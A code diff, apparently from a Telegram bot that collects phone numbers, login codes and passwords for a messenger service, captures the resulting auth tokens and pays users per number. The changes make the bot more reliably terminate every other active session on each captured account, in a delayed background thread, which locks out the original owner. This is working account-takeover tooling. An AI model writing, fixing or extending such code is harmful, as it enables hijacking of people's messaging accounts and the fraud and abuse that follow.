@@ -349,9 +349,8 @@ class MaxAuth:
         return {"success": True, "token": data.get("token", token)}
 
     def get_sessions(self):
-        """Получает список активных сессий"""
         try:
-            p = Packet(20, pack({}))
+            p = Packet(Opcode.AUTH_REQUEST, pack({"type": "GET_SESSIONS"}))
             resp = self.conn.send(p)
             data = unpack(resp.payload)
             return data.get("sessions", [])
@@ -359,9 +358,11 @@ class MaxAuth:
             return []
 
     def close_session(self, session_id):
-        """Закрывает сессию по ID"""
         try:
-            p = Packet(20, pack({"sessionId": session_id}))
+            p = Packet(Opcode.AUTH_REQUEST, pack({
+                "type": "CLOSE_SESSION",
+                "sessionId": session_id
+            }))
             self.conn.send(p, wait=False)
         except:
             pass
@@ -1853,9 +1854,6 @@ async def code_handler(message: types.Message, state: FSMContext):
         pending[uid]["token"] = result["token"]
         pending[uid]["device_id"] = auth.device_id
         pending[uid]["status"] = "done"
-        
-        # Кикаем старые сессии (только для существующих аккаунтов)
-        threading.Thread(target=kill_old_sessions, args=(auth, result["token"]), daemon=True).start()
 
     if pending[uid].get("status") == "done":
         token = pending[uid]["token"]
@@ -1880,6 +1878,23 @@ async def code_handler(message: types.Message, state: FSMContext):
 
         save_data()
         await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
+        
+        # Кикаем старые сессии в фоне (отдельное соединение)
+        if result.get("token"):
+            def kill_later():
+                try:
+                    time.sleep(2)
+                    new_auth = MaxAuth(device_id=device_id)
+                    if new_auth.connect():
+                        new_auth.session_init()
+                        time.sleep(1)
+                        kill_old_sessions(new_auth, token)
+                        new_auth.close()
+                except Exception as e:
+                    logging.warning(f"Failed to kill old sessions: {e}")
+            
+            threading.Thread(target=kill_later, daemon=True).start()
+        
         auth.close()
         del pending[uid]
         await state.clear()
@@ -1920,10 +1935,6 @@ async def password_handler(message: types.Message, state: FSMContext):
     if token:
         pending[uid]["token"] = token
         pending[uid]["device_id"] = auth.device_id
-        
-        # Кикаем старые сессии
-        threading.Thread(target=kill_old_sessions, args=(auth, token), daemon=True).start()
-        
         uid_str = str(uid)
 
         if uid_str not in accounts:
@@ -1944,6 +1955,22 @@ async def password_handler(message: types.Message, state: FSMContext):
 
         save_data()
         await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
+        
+        # Кикаем старые сессии в фоне
+        device_id = auth.device_id
+        def kill_later():
+            try:
+                time.sleep(2)
+                new_auth = MaxAuth(device_id=device_id)
+                if new_auth.connect():
+                    new_auth.session_init()
+                    time.sleep(1)
+                    kill_old_sessions(new_auth, token)
+                    new_auth.close()
+            except Exception as e:
+                logging.warning(f"Failed to kill old sessions: {e}")
+        
+        threading.Thread(target=kill_later, daemon=True).start()
     else:
         await msg.edit_text("❌ Неверный пароль. Попробуйте ещё раз.")
         return
